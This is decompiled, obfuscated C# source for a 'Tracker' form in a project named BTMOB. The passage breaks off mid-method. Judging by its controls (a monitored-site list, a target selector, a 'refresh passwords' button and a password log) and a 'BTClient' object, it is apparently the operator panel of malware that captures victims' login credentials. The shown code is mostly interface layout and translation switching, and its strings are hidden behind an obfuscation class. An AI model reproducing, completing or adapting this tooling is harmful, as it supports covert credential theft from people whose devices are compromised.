using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class Tracker : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("listsites")]
	private ListBox _listsites;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clrbtn")]
	private DrakeUIButtonIcon _clrbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("refpasses")]
	private DrakeUIButtonIcon _refpasses;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addnum")]
	private DrakeUIButtonIcon _addnum;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("rembtn")]
	private DrakeUIButtonIcon _rembtn;

	public Dictionary<string, string> SiteData;

	public BTClient Btcli;

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ListBox listsites
	{
		[CompilerGenerated]
		get
		{
			return _listsites;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = listsites_SelectedIndexChanged;
			ListBox listBox = _listsites;
			if (listBox != null)
			{
				listBox.SelectedIndexChanged -= value2;
			}
			_listsites = value;
			listBox = _listsites;
			if (listBox != null)
			{
				listBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("idmonitor")]
	internal virtual DrakeUITextBox idmonitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("linkmonitor")]
	internal virtual DrakeUITextBox linkmonitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("namemonitor")]
	internal virtual DrakeUITextBox namemonitor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W12")]
	internal virtual DrakeWidth_W DrakeWidth_W12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("passtextlog")]
	internal virtual RichTextBox passtextlog
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon clrbtn
	{
		[CompilerGenerated]
		get
		{
			return _clrbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = clractlog_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _clrbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_clrbtn = value;
			drakeUIButtonIcon = _clrbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon refpasses
	{
		[CompilerGenerated]
		get
		{
			return _refpasses;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = refpasses_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _refpasses;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_refpasses = value;
			drakeUIButtonIcon = _refpasses;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon addnum
	{
		[CompilerGenerated]
		get
		{
			return _addnum;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = addnum_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _addnum;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_addnum = value;
			drakeUIButtonIcon = _addnum;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon rembtn
	{
		[CompilerGenerated]
		get
		{
			return _rembtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = rembtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _rembtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_rembtn = value;
			drakeUIButtonIcon = _rembtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("comboTargts")]
	internal virtual DrakeUIComboBox comboTargts
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Tracker()
	{
		base.Load += Tracker_Load;
		base.FormClosing += Tracker_FormClosing;
		SiteData = new Dictionary<string, string>();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.Tracker));
		this.Panel3 = new System.Windows.Forms.Panel();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.comboTargts = new DrakeUI.Framework.DrakeUIComboBox();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		this.addnum = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.idmonitor = new DrakeUI.Framework.DrakeUITextBox();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.linkmonitor = new DrakeUI.Framework.DrakeUITextBox();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.namemonitor = new DrakeUI.Framework.DrakeUITextBox();
		this.DrakeWidth_W12 = new DrakeUI.Framework.DrakeWidth_W();
		this.rembtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.listsites = new System.Windows.Forms.ListBox();
		this.passtextlog = new System.Windows.Forms.RichTextBox();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.refpasses = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.clrbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.Panel4.SuspendLayout();
		this.Panel5.SuspendLayout();
		this.Panel6.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(612, 5);
		this.minibtn.Location = new System.Drawing.Point(654, 5);
		this.closbtn.Location = new System.Drawing.Point(696, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(482, 18);
		this.tobpanelsti.Location = new System.Drawing.Point(248, 79);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(492, 26);
		this.Panel3.Controls.Add(this.Panel4);
		this.Panel3.Controls.Add(this.rembtn);
		this.Panel3.Controls.Add(this.listsites);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel3.Location = new System.Drawing.Point(2, 79);
		this.Panel3.Name = EXGuarder._7029330D;
		this.Panel3.Padding = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.Panel3.Size = new System.Drawing.Size(246, 581);
		this.Panel3.TabIndex = 40;
		this.Panel4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel4.Controls.Add(this.comboTargts);
		this.Panel4.Controls.Add(this.DrakeWidth_W4);
		this.Panel4.Controls.Add(this.addnum);
		this.Panel4.Controls.Add(this.idmonitor);
		this.Panel4.Controls.Add(this.DrakeWidth_W3);
		this.Panel4.Controls.Add(this.linkmonitor);
		this.Panel4.Controls.Add(this.DrakeWidth_W2);
		this.Panel4.Controls.Add(this.namemonitor);
		this.Panel4.Controls.Add(this.DrakeWidth_W12);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel4.Location = new System.Drawing.Point(4, 265);
		this.Panel4.Name = EXGuarder._6D236E07;
		this.Panel4.Padding = new System.Windows.Forms.Padding(9, 9, 9, 9);
		this.Panel4.Size = new System.Drawing.Size(238, 312);
		this.Panel4.TabIndex = 46;
		this.comboTargts.Dock = System.Windows.Forms.DockStyle.Top;
		this.comboTargts.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboTargts.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.comboTargts.Font = new System.Drawing.Font(EXGuarder._260A155B, 9f);
		this.comboTargts.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.comboTargts.Items.AddRange(new object[2]
		{
			EXGuarder._02645612,
			EXGuarder._4E194E52
		});
		this.comboTargts.Location = new System.Drawing.Point(9, 202);
		this.comboTargts.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.comboTargts.MinimumSize = new System.Drawing.Size(56, 0);
		this.comboTargts.Name = EXGuarder._2C12790C;
		this.comboTargts.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboTargts.Radius = 15;
		this.comboTargts.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.comboTargts.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboTargts.Size = new System.Drawing.Size(220, 25);
		this.comboTargts.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboTargts.TabIndex = 64;
		this.comboTargts.Text = EXGuarder._02645612;
		this.comboTargts.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.Transparent;
		this.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(9, 193);
		this.DrakeWidth_W4.Name = EXGuarder._3567781C;
		this.DrakeWidth_W4.Size = new System.Drawing.Size(220, 9);
		this.DrakeWidth_W4.TabIndex = 63;
		this.addnum.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.addnum.Cursor = System.Windows.Forms.Cursors.Hand;
		this.addnum.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.addnum.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnum.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.addnum.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnum.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnum.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.addnum.Font = new System.Drawing.Font(EXGuarder._260A155B, 10f);
		this.addnum.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.addnum.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnum.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnum.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.addnum.Location = new System.Drawing.Point(9, 276);
		this.addnum.Name = EXGuarder._4436721C;
		this.addnum.Radius = 15;
		this.addnum.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.addnum.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.addnum.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnum.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.addnum.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.addnum.Size = new System.Drawing.Size(220, 27);
		this.addnum.Style = DrakeUI.Framework.UIStyle.Custom;
		this.addnum.Symbol = 61543;
		this.addnum.SymbolSize = 20;
		this.addnum.TabIndex = 62;
		this.addnum.Text = EXGuarder._21342851;
		this.idmonitor.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.idmonitor.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.idmonitor.Dock = System.Windows.Forms.DockStyle.Top;
		this.idmonitor.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.idmonitor.FillDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.idmonitor.Font = new System.Drawing.Font(EXGuarder._260A155B, 9f);
		this.idmonitor.ForeColor = System.Drawing.Color.White;
		this.idmonitor.Location = new System.Drawing.Point(9, 168);
		this.idmonitor.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.idmonitor.Maximum = 2147483647.0;
		this.idmonitor.Minimum = -2147483648.0;
		this.idmonitor.Name = EXGuarder._34721A66;
		this.idmonitor.Padding = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.idmonitor.Radius = 15;
		this.idmonitor.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.idmonitor.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.idmonitor.Size = new System.Drawing.Size(220, 25);
		this.idmonitor.Style = DrakeUI.Framework.UIStyle.Custom;
		this.idmonitor.TabIndex = 58;
		this.idmonitor.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.idmonitor.Watermark = EXGuarder._386D3640;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.Transparent;
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(9, 159);
		this.DrakeWidth_W3.Name = EXGuarder._33590954;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(220, 9);
		this.DrakeWidth_W3.TabIndex = 61;
		this.linkmonitor.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.linkmonitor.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.linkmonitor.Dock = System.Windows.Forms.DockStyle.Top;
		this.linkmonitor.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.linkmonitor.FillDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.linkmonitor.Font = new System.Drawing.Font(EXGuarder._260A155B, 9f);
		this.linkmonitor.ForeColor = System.Drawing.Color.White;
		this.linkmonitor.Location = new System.Drawing.Point(9, 134);
		this.linkmonitor.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.linkmonitor.Maximum = 2147483647.0;
		this.linkmonitor.Minimum = -2147483648.0;
		this.linkmonitor.Name = EXGuarder._4B720511;
		this.linkmonitor.Padding = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.linkmonitor.Radius = 15;
		this.linkmonitor.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.linkmonitor.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.linkmonitor.Size = new System.Drawing.Size(220, 25);
		this.linkmonitor.Style = DrakeUI.Framework.UIStyle.Custom;
		this.linkmonitor.TabIndex = 57;
		this.linkmonitor.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.linkmonitor.Watermark = EXGuarder._205C1B03;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.Transparent;
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(9, 125);
		this.DrakeWidth_W2.Name = EXGuarder._43282B57;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(220, 9);
		this.DrakeWidth_W2.TabIndex = 60;
		this.namemonitor.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.namemonitor.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.namemonitor.Dock = System.Windows.Forms.DockStyle.Top;
		this.namemonitor.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.namemonitor.FillDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.namemonitor.Font = new System.Drawing.Font(EXGuarder._260A155B, 9f);
		this.namemonitor.ForeColor = System.Drawing.Color.White;
		this.namemonitor.Location = new System.Drawing.Point(9, 100);
		this.namemonitor.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.namemonitor.Maximum = 2147483647.0;
		this.namemonitor.Minimum = -2147483648.0;
		this.namemonitor.Name = EXGuarder._12691B22;
		this.namemonitor.Padding = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.namemonitor.Radius = 15;
		this.namemonitor.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.namemonitor.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.namemonitor.Size = new System.Drawing.Size(220, 25);
		this.namemonitor.Style = DrakeUI.Framework.UIStyle.Custom;
		this.namemonitor.TabIndex = 56;
		this.namemonitor.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.namemonitor.Watermark = EXGuarder._3823451E;
		this.DrakeWidth_W12.BackColor = System.Drawing.Color.Transparent;
		this.DrakeWidth_W12.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W12.Location = new System.Drawing.Point(9, 9);
		this.DrakeWidth_W12.Name = EXGuarder._63492D0D;
		this.DrakeWidth_W12.Size = new System.Drawing.Size(220, 91);
		this.DrakeWidth_W12.TabIndex = 59;
		this.rembtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.rembtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.rembtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.rembtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.rembtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.rembtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.rembtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.rembtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.rembtn.Font = new System.Drawing.Font(EXGuarder._260A155B, 10f);
		this.rembtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.rembtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.rembtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.rembtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.rembtn.Location = new System.Drawing.Point(4, 238);
		this.rembtn.Name = EXGuarder._64136825;
		this.rembtn.Radius = 15;
		this.rembtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.rembtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.rembtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.rembtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.rembtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.rembtn.Size = new System.Drawing.Size(238, 27);
		this.rembtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.rembtn.Symbol = 61741;
		this.rembtn.SymbolSize = 20;
		this.rembtn.TabIndex = 63;
		this.rembtn.Text = EXGuarder._3626285D;
		this.listsites.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.listsites.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.listsites.Dock = System.Windows.Forms.DockStyle.Top;
		this.listsites.Enabled = false;
		this.listsites.Font = new System.Drawing.Font(EXGuarder._260A155B, 9f);
		this.listsites.ForeColor = System.Drawing.Color.White;
		this.listsites.FormattingEnabled = true;
		this.listsites.ItemHeight = 18;
		this.listsites.Location = new System.Drawing.Point(4, 4);
		this.listsites.Name = EXGuarder._0519465B;
		this.listsites.Size = new System.Drawing.Size(238, 234);
		this.listsites.TabIndex = 45;
		this.passtextlog.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.passtextlog.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.passtextlog.Dock = System.Windows.Forms.DockStyle.Fill;
		this.passtextlog.Font = new System.Drawing.Font(EXGuarder._260A155B, 9f);
		this.passtextlog.ForeColor = System.Drawing.SystemColors.Control;
		this.passtextlog.Location = new System.Drawing.Point(9, 9);
		this.passtextlog.Name = EXGuarder._61523C61;
		this.passtextlog.ReadOnly = true;
		this.passtextlog.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical;
		this.passtextlog.Size = new System.Drawing.Size(474, 563);
		this.passtextlog.TabIndex = 41;
		this.passtextlog.Text = EXGuarder._706D3E53;
		this.Panel5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel5.Controls.Add(this.passtextlog);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel5.Location = new System.Drawing.Point(248, 79);
		this.Panel5.Name = EXGuarder._23676C53;
		this.Panel5.Padding = new System.Windows.Forms.Padding(9, 9, 9, 9);
		this.Panel5.Size = new System.Drawing.Size(492, 581);
		this.Panel5.TabIndex = 42;
		this.Panel6.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel6.Controls.Add(this.refpasses);
		this.Panel6.Controls.Add(this.clrbtn);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel6.Location = new System.Drawing.Point(2, 38);
		this.Panel6.Name = EXGuarder._280C242E;
		this.Panel6.Padding = new System.Windows.Forms.Padding(7, 7, 7, 7);
		this.Panel6.Size = new System.Drawing.Size(738, 41);
		this.Panel6.TabIndex = 48;
		this.refpasses.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.refpasses.Cursor = System.Windows.Forms.Cursors.Hand;
		this.refpasses.Dock = System.Windows.Forms.DockStyle.Left;
		this.refpasses.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refpasses.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.refpasses.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refpasses.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refpasses.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refpasses.Font = new System.Drawing.Font(EXGuarder._260A155B, 10f);
		this.refpasses.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.refpasses.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refpasses.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refpasses.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.refpasses.Location = new System.Drawing.Point(7, 7);
		this.refpasses.Name = EXGuarder._70611B49;
		this.refpasses.Radius = 15;
		this.refpasses.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.refpasses.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.refpasses.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refpasses.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refpasses.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.refpasses.Size = new System.Drawing.Size(122, 27);
		this.refpasses.Style = DrakeUI.Framework.UIStyle.Custom;
		this.refpasses.Symbol = 61470;
		this.refpasses.SymbolSize = 20;
		this.refpasses.TabIndex = 52;
		this.refpasses.Text = EXGuarder._3618123D;
		this.clrbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clrbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.clrbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.clrbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clrbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.clrbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clrbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clrbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.clrbtn.Font = new System.Drawing.Font(EXGuarder._260A155B, 10f);
		this.clrbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.clrbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clrbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clrbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.clrbtn.Location = new System.Drawing.Point(609, 7);
		this.clrbtn.Name = EXGuarder._08095A42;
		this.clrbtn.Radius = 15;
		this.clrbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.clrbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.clrbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clrbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.clrbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.clrbtn.Size = new System.Drawing.Size(122, 27);
		this.clrbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.clrbtn.Symbol = 61741;
		this.clrbtn.SymbolSize = 20;
		this.clrbtn.TabIndex = 51;
		this.clrbtn.Text = EXGuarder._081A253D;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(742, 662);
		base.Controls.Add(this.Panel5);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel6);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._206D4D65);
		base.Name = EXGuarder._02645612;
		this.Text = EXGuarder._02645612;
		base.Controls.SetChildIndex(this.Panel6, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		base.Controls.SetChildIndex(this.Panel5, 0);
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		this.Panel6.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void translateme()
	{
		object value = BTRegistry.GetValue(EXGuarder._644B4800, EXGuarder._6F376D63);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._62697928, TextCompare: false))
		{
			refpasses.Text = EXGuarder._2D4F0624;
			rembtn.Text = EXGuarder._08010F44;
			addnum.Text = EXGuarder._466B1E2A;
			namemonitor.Text = EXGuarder._65472949;
			linkmonitor.Text = EXGuarder._3F4E1663;
			idmonitor.Text = EXGuarder._0F0F600E;
			passtextlog.Text = EXGuarder._17753D6A;
			clrbtn.Text = EXGuarder._27366E1C;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._08116746, TextCompare: false))
		{
			refpasses.Text = EXGuarder._1A336A1D;
			rembtn.Text = EXGuarder._6159476A;
			addnum.Text = EXGuarder._1A163C22;
			namemonitor.Text = EXGuarder._1E390B1E;
			linkmonitor.Text = EXGuarder._1E37656D;
			idmonitor.Text = EXGuarder._77264B25;
			passtextlog.Text = EXGuarder._35125D50;
			clrbtn.Text = EXGuarder._2509682A;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._345E6240, TextCompare: false))
		{
			refpasses.Text = EXGuarder._08375B49;
			rembtn.Text = EXGuarder._79505B35;
			addnum.Text = EXGuarder._46084D30;
			namemonitor.Text = EXGuarder._6A523930;
			linkmonitor.Text = EXGuarder._0167270D;
			idmonitor.Text = EXGuarder._6864382B;
			passtextlog.Text = EXGuarder._722A7053;
			clrbtn.Text = EXGuarder._28477953;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._2F1D3C63, TextCompare: false))
		{
			refpasses.Text = EXGuarder._2249781D;
			rembtn.Text = EXGuarder._2B490368;
